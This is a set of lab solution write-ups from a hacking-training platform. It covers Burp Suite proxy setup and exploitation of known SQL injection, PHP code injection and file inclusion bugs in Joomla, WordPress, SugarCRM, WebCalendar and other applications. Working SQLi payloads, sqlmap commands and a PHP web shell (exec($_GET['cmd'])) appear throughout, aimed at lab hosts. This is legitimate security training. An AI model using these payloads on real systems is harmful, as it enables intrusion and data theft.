Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Complain Mgmt System 
URL 
https://www.attackdefense.com/challengedetails?cid=478  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
 
Step 2: ​Search on google “Complain Mgmt System sql injection” and look for publically 
available exploits.  
 
 
The exploit db link contains the sqlmap out which can be used to exploit the SQL Injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41131 
 
 
 
 
 
 
 
 
 
Step 3: ​Login to the web application. 
 
The login credential of the web application is provided in the challenge description 
 
●
Username: admin 
●
Password: admin123 
 
Select “Administrator” in “User Type” drop down 
 
 
 
 
 
 
 
 
Admin Dashboard:  
 
 
 
Step 4: ​Form the URL using the SQLI Payload provided in the sqlmap output at the exploit db 
link and exploit the vulnerability. 
 
URL: 
http://a4su46npae45ebmq1nnss301v.public2.attackdefenselabs.com/process.php?action=delet
eCust&cId=123%20AND%20EXTRACTVALUE(8194,CONCAT(0x5c,0x7171706a71,(SELECT
%20(ELT(8194=8194,1))),0x716a6b6271)) 
 
 
 
The injected SQLI payload was executed.  
 
 
Step 5: ​Retrieve the MySQL server version information by modifying the URL used to exploit 
the vulnerability in previous step. 
 
URL: 
http://a4su46npae45ebmq1nnss301v.public2.attackdefenselabs.com/process.php?action=delet
eCust&cId=123%20AND%20EXTRACTVALUE(8194,CONCAT(0x5c,version(),(SELECT%20(E
LT(8194=8194,1))),0x716a6b6271)) 
 
 
 
 
 
 
 
 
 
References:  
 
1.
Complain Management System 
(​https://sourceforge.net/projects/complain-management-system/​)  
2.
Complain Management System - SQL injection 
(​https://www.exploit-db.com/exploits/41131​)  
 
 
 
Name 
Joomla Component Fields 
URL 
https://www.attackdefense.com/challengedetails?cid=479  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Joomla Component Fields sql injection” and look for publically 
available exploits.  
 
 
 
The exploit db link contains the metasploit module for the corresponding SQL injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44358 
 
 
 
Step 3: ​Analysis of the “sqli” function in the metasploit module reveals the vulnerable parameter 
“list[fullordering]” along with other parameters required to form the target URL. Find the SQLI 
payload using sqlmap. 
 
Target URL: 
http://yl9evde1udyq9sgn5zw44d523.public2.attackdefenselabs.com/joomla/index.php?option=c
om_fields&view=fields&layout=modal&list[fullordering]=123 
 
Vulnerable parameter:​ list[fullordering] 
 
 
Command: ​sqlmap -u 
"http://yl9evde1udyq9sgn5zw44d523.public2.attackdefenselabs.com/joomla/index.php?option=c
om_fields&view=fields&layout=modal&list[fullordering]=123" -p "list[fullordering]" 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“y” for “Do you want to follow?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
Payload: ​option=com_fields&view=fields&layout=modal&list[fullordering]=123 AND (SELECT 
3694 FROM(SELECT COUNT(*),CONCAT(0x717a707a71,(SELECT 
(ELT(3694=3694,1))),0x71786a7171,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
 
Step 4: ​Using the payload obtained in previous step, form the URL required to exploit the 
vulnerability.  
 
Navigate to the URL given below. 
 
URL: 
http://yl9evde1udyq9sgn5zw44d523.public2.attackdefenselabs.com/joomla/index.php?option=c
om_fields&view=fields&layout=modal&list[fullordering]=123%20AND%20(SELECT%203694%2
0FROM(SELECT%20COUNT(*),CONCAT(0x717a707a71,(SELECT%20(ELT(3694=3694,1))),0
x71786a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20G
ROUP%20BY%20x)a) 
 
 
 
 
 
 
 
 
 
 
The injected SQLI payload was executed.  
 
Step 5: ​Modify the payload used in previous step and retrieve the MySQL server version 
information. 
 
Payload: ​option=com_fields&view=fields&layout=modal&list[fullordering]=123 AND (SELECT 
3694 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT 
(ELT(3694=3694,1))),0x71786a7171,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
 
 
 
 
 
 
 
URL: 
http://yl9evde1udyq9sgn5zw44d523.public2.attackdefenselabs.com/joomla/index.php?option=c
om_fields&view=fields&layout=modal&list[fullordering]=123%20AND%20(SELECT%203694%2
0FROM(SELECT%20COUNT(*),CONCAT(version(),(SELECT%20(ELT(3694=3694,1))),0x7178
6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROU
P%20BY%20x)a) 
 
 
 
 
The MySQL Server version information was revealed. 
 
References:  
 
1.
Components Fields Fields (​https://docs.joomla.org/Help39:Components_Fields_Fields​) 
 
2.
Joomla Component Fields - SQLi Remote Code Execution (Metasploit) 
(​https://www.exploit-db.com/exploits/44358​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
Name 
Joomla Media Library 
URL 
https://www.attackdefense.com/challengedetails?cid=480  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “Joomla Media Library sql injection” and look for publically available 
exploits.  
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44122 
 
 
 
 
 
 
 
 
Step 3: ​The SQLI payload provided at exploit db link is base64 encoded. Decode the SQLI 
payload. 
 
Commands: 
echo 
MStBTkQoU0VMRUNUKzErRlJPTShTRUxFQ1QrQ09VTlQoKiksQ09OQ0FUKChTRUxFQ1QrK
FNFTEVDVCtDT05DQVQoQ0FTVChWRVJTSU9OKCkrQVMrQ0hBUiksMHg3ZSkpK0ZST00rS
U5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUytMSU1JVCswLDEpLEZMT09SKFJBTkQoMCkqMi
kpeCtGUk9NK0lORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMrR1JPVVArQlkreClhKStBTkQ
rMT0x | base64 -d > sqli-payload 
 
cat sqli-payload 
 
 
 
 
 
Decoded Payload: 
1+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CA
ST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FL
OOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1 
 
Step 4: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
URL: 
http://jn65gf50drvtaaffmp0sfe5pq.public1.attackdefenselabs.com/index.php?option=com_medial
ibrary&task=view_author&id=1+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELE
CT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCH
EMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES
+GROUP+BY+x)a)+AND+1=1 
 
 
 
The MySQL server version information is revealed.  
 
 
References:  
 
1.
MediaLibrary Basic 
(​https://extensions.joomla.org/extensions/extension/living/education-a-culture/medialibrar
y-basic/​)  
2.
Joomla! Component MediaLibrary Free 4.0.12 - SQL Injection 
(​https://www.exploit-db.com/exploits/44122​)  
 
 
 
Name 
WordPress Survey and Poll 
URL 
https://www.attackdefense.com/challengedetails?cid=481  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “WordPress Survey and Poll Plugin sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the SQL injection payload and the information regarding the target 
URL. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36054  
 
 
 
 
 
 
 
Step 3: ​Find the SQL Injection payload using sqlmap. 
 
Target URL: 
http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498 
 
Vulnerable parameter: ​survey_id 
 
Command: ​sqlmap -u 
"http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498" -p survey_id --dbms=mysql 
 
Enter the following answer when asked for questions. 
 
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?”  
“n” for “Do you want to keep testing the others (if any) ?” 
 
 
 
 
 
 
 
Payloads: 
 
Type: ​boolean-based blind 
Payload: ​action=ajax_survey&sspcmd=save&survey_id=3556498 AND 5090=5090 
 
Type: ​AND/OR time-based blind 
Payload: ​action=ajax_survey&sspcmd=save&survey_id=3556498 AND SLEEP(5) 
 
Step 4: ​Form the URL by using the boolean-based blind payload generated in the previous step 
and exploit the SQL injection vulnerability. 
 
Payload: ​action=ajax_survey&sspcmd=save&survey_id=3556498 AND 5090=5090 
 
URL: 
http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498+AND+5090=5090 
 
Command: ​curl 
"http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498+AND+5090=5090" 
 
 
  
The output returned is “updated”. 
 
Modify the equality to inequality in the SQLI payload. 
 
Payload: ​action=ajax_survey&sspcmd=save&survey_id=3556498 AND 5090=5091 
 
URL: 
http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498+AND+5090=5091 
 
Command: ​curl 
"http://v9hm4160dn22u9vikt2mk6l9p.public1.attackdefenselabs.com/wp-admin/admin-ajax.php?
action=ajax_survey&sspcmd=save&survey_id=3556498+AND+5090=5091" 
 
 
 
 
The output returned is “success”.  
 
Since by changing the equality, the generated output is different, It can be concluded that the 
injected SQLI payload was executed and the web application is vulnerable to SQL injection. 
 
 
References:  
 
1.
WordPress Survey & Poll (​https://wordpress.org/plugins/wp-survey-and-poll/​)  
2.
WordPress Plugin Survey and Poll 1.1 - Blind SQL Injection 
(​https://www.exploit-db.com/exploits/36054​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
Name 
CF Image Host 
URL 
https://www.attackdefense.com/challengedetails?cid=237  
Type 
Real World Webapps : Command Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
Step 2: ​Search on google “CF Image Host command injection” and look for publically available 
exploits.  
 
 
 
The exploit db link provides the steps to be followed in order to exploit the vulnerable web 
application. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38699 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Identifying the platform. 
 
The payload which will be used later will depend on the platform. 
 
Command: ​nikto -h http://5kd0o05tm2i97sypc06sdl7a9.public1.attackdefenselabs.com/ 
 
 
 
 
The x-powered-by header reveals that the web application is running on a linux platform. 
 
Step 4: ​Login to the web application. The admin portal URL is provided at the exploit db Link.  
 
Admin Portal URL: 
http://5kd0o05tm2i97sypc06sdl7a9.public1.attackdefenselabs.com/admin.php 
 
 
 
The login credential of the admin portal of the  web application is provided in the challenge 
description. 
 
●
Username: admin 
●
Password: password 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Navigate to the settings tab and Inject the PHP payload in the “Site Title” textbox. 
 
Modify the payload obtained from exploit db link to execute “id” command and save the output 
to “output” file. 
 
PHP Payload: ​';echo exec("id > output");'';'; 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the “Save Changes” button and the injected php payload will be executed.  
 
 
 
 
 
Step 6:​ The output of the executed command is stored in “output” file on the web server. Check 
the content of output file. 
 
The content of output file can be read by navigating to the URL given below: 
 
URL: ​http://5kd0o05tm2i97sypc06sdl7a9.public1.attackdefenselabs.com/output 
 
 
 
 
 
References:  
 
1.
CF Image Host 1.65 - PHP Command Injection 
(​https://www.exploit-db.com/exploits/38699​)  
 
 
 
 
 
Name 
Sugar CRM  
URL 
https://www.attackdefense.com/challengedetails?cid=238  
Type 
Real World Webapps : Command Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “sugarcrm command injection” and look for publically available 
exploits.  
 
 
 
The exploit db link contains the GET request parameters required exploit the vulnerable web 
application. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40027 
 
 
 
 
 
 
 
Step 3: ​Identifying the platform. 
 
The payload which will be used later will depend on the platform. 
 
Command: ​nikto -h http://5kd0o05tm2i97sypc06sdl7a9.public1.attackdefenselabs.com/ 
 
 
 
 
 
 
 
The x-powered-by header reveals that the web application is running on a linux platform. 
 
Step 4: ​Login to the web application. 
 
The login credential of the admin portal of the web application is provided in the challenge 
description. 
 
●
Username: admin 
●
Password: password1 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Navigate to the URL provided at the exploit db link to execute phpinfo() on the web 
server. 
 
URL: 
http://15xphpiufmgrivxsb5ndusp8p.public1.attackdefenselabs.com/index.php?module=Connecto
rs&action=RunTest&source_id=ext_rest_insideview&ext_rest_insideview_[%27.phpinfo().%27]=
1 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 6: ​Modify the injected payload in the get request to execute “id” command and save its 
output to “output” file.  
 
Navigate to the URL given below twice to execute the injected payload 
 
URL: 
http://15xphpiufmgrivxsb5ndusp8p.public1.attackdefenselabs.com/index.php?module=Connecto
rs&action=RunTest&source_id=ext_rest_insideview&ext_rest_insideview_[%27.exec('id > 
output').%27]=1 
 
 
 
 
 
 
The output of the executed command is stored in “output” file on the web server. Check the 
content of output file 
 
URL: ​http://15xphpiufmgrivxsb5ndusp8p.public1.attackdefenselabs.coam/output 
 
 
 
 
 
References:  
 
1.
SugarCRM (​https://www.sugarcrm.com/​) 
2.
SugarCRM 6.5.18 - PHP Code Injection 
(​https://www.exploit-db.com/exploits/40027​)  
 
 
 
 
 
 
 
Name 
BanManager Web UI 
URL 
https://www.attackdefense.com/challengedetails?cid=500  
Type 
Real World Webapps : Command Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
 
Step 2: ​Search on google “BanManager Web UI command injection” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains information required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41989 
 
 
 
 
 
 
 
Step 3: ​Login to the web application. The admin portal URL is provided at the exploit db Link.  
 
Admin Portal URL: 
http://v52j1rhz70a7hrkwkyloh6pw4.public1.attackdefenselabs.com/index.php?action=admin 
 
 
 
The login password of the web application is provided in the challenge description. 
 
●
Password: password1 
 
Dashboard:  
 
 
Step 4: ​Inject the PHP payload in the “Footer” textbox. 
 
PHP Payload: ​';echo exec($_GET["cmd"]);// 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save Button and the php code will be injected in the settings.php file. 
 
Step 5: ​Navigate to the URL given below to execute the injected payload. 
 
URL: ​http://v52j1rhz70a7hrkwkyloh6pw4.public1.attackdefenselabs.com/settings.php 
 
 
 
 
No output is returned because the cmd parameter was not specified. Pass the command to be 
executed as cmd parameter while sending the GET request.  
 
The URL given below will execute “id” command on the web server.  
 
URL: ​http://v52j1rhz70a7hrkwkyloh6pw4.public1.attackdefenselabs.com/settings.php?cmd=id 
 
 
 
 
 
 
 
 
 
References:  
 
1.
BanManager-WebUI (​https://github.com/BanManagement/BanManager-WebUI​)  
2.
BanManager WebUI 1.5.8 - PHP Code Injection  
(​https://www.exploit-db.com/exploits/41989​)  
 
 
 
 
 
Name 
WebCalendar 
URL 
https://www.attackdefense.com/challengedetails?cid=501  
Type 
Real World Webapps : Command Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “webcalander command injection” and look for publically available 
exploits.  
 
 
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application. 
Analysis of the python script reveals that “install/index.php” web page is vulnerable to command 
injection and the injected payload gets stored in “includes/settings.php” file  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/18775 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Identifying the platform. 
 
The payload which will be used later will depend on the platform. 
 
Command: ​nikto -h http://23n3x4xdxutq9oej4pllrrma2.public1.attackdefenselabs.com 
 
 
 
 
 
 
 
 
 
The x-powered-by header reveals that the web application is running on a linux platform. 
 
Step 4: ​Navigate to the “install” directory of the web application and find the version of the web 
application. 
 
URL: ​http://23n3x4xdxutq9oej4pllrrma2.public1.attackdefenselabs.com/install/ 
 
 
 
 
Click on “System Administrator’s Guide” hyperlink 
 
 
 
The version of webcalander is 1.2.7 and therefore the provided python script at exploit db link 
will not work.  
 
 
 
 
 
 
 
Step 5: ​Since “index.php” web page writes the configuration to “settings.php” file. Find a 
property which is provided by the user and then saved in “settings.php” file 
 
Login to the web application with the password provided in the challenge description. 
 
●
Password: password 
 
After logging in:  
 
 
 
Click on the Next button 
 
 
 
 
 
 
 
 
The database settings section contains text fields. These text fields could be vulnerable to 
injection attacks. 
 
Step 6: ​Analyze the source code of the web application and figure out the payload required to 
exploit the web application 
 
Finding source code of the web application: 
 
Search on google, “webcalander source code”. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Navigate to the GitHub Link and find the release for webcalander 1.2.7 
 
URL: ​https://github.com/craigk5n/webcalendar/releases 
 
 
 
 
 
 
 
 
 
 
 
Download the source code of the web application: 
 
Command: ​wget https://github.com/craigk5n/webcalendar/archive/v1.2.7.zip 
 
 
 
 
Extract the archive.  
 
 
 
Command: ​unzip v1.2.7.zip 
 
 
 
 
Since the payload will be stored in “includes/settings.php” file. Find out how the attributes are 
stored in “includes/settings.php” file. 
 
Commands:  
cd webcalander-1.2.7/ 
cd includes/ 
ls  
 
 
 
“settings.php” file does not exist however a file named “settings.php.orig” exists.  
 
Check the content of “settings.php.orig” file 
 
 
Command: ​cat settings.php.orig 
 
 
 
 
 
 
 
 
 
The comment in the “settings.php.orig” file reveals that the same file can be copied as 
“settings.php” 
 
Since all of the attributes are enclosed inside a comment block, to execute PHP code, the 
injected payload will have to contain the code to close the comment block first followed by the 
PHP code to be executed. 
 
PHP Payload: ​*/?><?php echo `id`; ?> 
 
The above PHP payload will execute ‘id’ command on the web server.  
 
 
 
Step 7: ​Inject the PHP payload in the “Database Cache Directory” textbox. 
 
PHP Payload: ​*/?><?php echo `id`; ?> 
 
 
Click on “Test Settings” Button 
 
 
 
The Settings were saved.  
 
 
 
 
 
 
 
 
Step 8: ​Navigate to “includes/settings.php” webpage to execute the injected payload. 
 
 
 
References:  
 
1.
WebCalendar (​https://github.com/craigk5n/webcalendar​)  
2.
WebCalendar 1.2.4 - Remote Code Execution 
(​https://www.exploit-db.com/exploits/18775​)  
 
 
 
 
 
Name 
Rips Scanner 
URL 
https://www.attackdefense.com/challengedetails?cid=276  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “rips scanner local file inclusion” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the target 
URL. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39094 
 
 
 
 
 
 
 
 
Step 3: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ /windows/code.php 
 
Vulnerable Parameter: ​file 
 
